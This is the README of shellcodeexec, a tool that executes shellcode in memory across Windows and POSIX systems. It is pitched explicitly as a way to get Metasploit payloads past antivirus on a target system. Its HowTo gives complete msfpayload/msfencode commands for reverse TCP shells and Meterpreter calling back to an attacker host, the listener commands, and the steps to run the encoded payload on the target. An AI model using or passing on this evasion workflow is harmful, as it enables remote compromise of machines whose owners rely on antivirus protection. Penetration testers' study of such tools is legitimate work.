## Background

Most of the shellcode launchers out there, including proof of concepts part of many "security" books, detail how to allocate a memory page as readable/writable/executable on POSIX systems, copy over your shellcode and execute it. This works just fine. However, it is limited to POSIX, does not necessarily consider 64-bit architecture and Windows systems.

## Description

shellcodeexec is an open source script to execute in memory a sequence of opcodes.

This script and the relevant project files (Makefile and Visual Studio files) allow you to compile the tool once then run your shellcode across different architectures and operating systems.

Moreover, it solves a common real world issue: the target system's anti virus software blocking a Metasploit-generated payload stager (either EXE of ELF). Take for instance the following command line:

    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/shikata_ga_nai -o /tmp/payload.exe -t exe

This generates a Metasploit payload stager, payload.exe, that as soon as it lands on the AV-protected target system is recognized as malicious and potentially blocked (depending on the on-access scan settings) by many anti virus products. At the time of writing this text, 21 out 41 anti viruses detect it as malicious - http://goo.gl/HTw7o. By encoding it multiple times with msfencode, less AV softwares detect it, still a lot.

I have been surfing the Net and found some interesting tutorials and guides about packing, compressing, obfuscating and applying IDA-foo to portable executables et similar in order to narrow down the number of AV products that can detect it as a malicious file. This is all interesting, but does not stop few hard-to-die anti viruses to detect your backdoor.

So the question is, how cool would it be to have a final solution to avoid all this hassle? This is exactly where this tool comes into play!

## Features

shellcodeexec:

* Can be compiled and works on POSIX (Linux/Unices) and Windows systems.
* Can be compiled and works on 32-bit and 64-bit architectures.
* As far as I know, no AV detect it as malicious.
* Works in DEP/NX-enabled environments: it allocates the memory page where it stores the shellcode as +rwx - Readable Writable and eXecutable.
* It supports alphanumeric encoded payloads: you can pipe your binary-encoded shellcode (generated for instance with Metasploit's msfpayload) to Metasploit's msfencode to encode it with the alpha_mixed encoder. Set the BufferRegister variable to EAX registry where the address in memory of the shellcode will be stored, to avoid get_pc() binary stub to be prepended to the shellcode.
* Spawns a new thread where the shellcode is executed in a structure exception handler (SEH) so that if you wrap shellcodeexec into your own executable, it avoids the whole process to crash in case of unexpected behaviours.

## HowTo

1. Generate a Metasploit shellcode and encode it with the alphanumeric encoder. For example for a Linux target:
```
$ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
```
Or for a Windows target:
```
$ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
```
2. Execute the Metasploit multi/handler listener on your machine. For example for a Linux target:
```
$ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
```
Or for a Windows target:
```
$ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
```
3. Execute the alphanumeric-encoded shellcode with this tool. For example on the Linux target:
```
$ ./shellcodeexec <msfencode's alphanumeric-encoded payload>
```
Or, on the Windows target:
```
C:\WINDOWS\Temp>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
```

## License

This source code is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version.

This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more details.

You should have received a copy of the GNU Lesser General Public License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
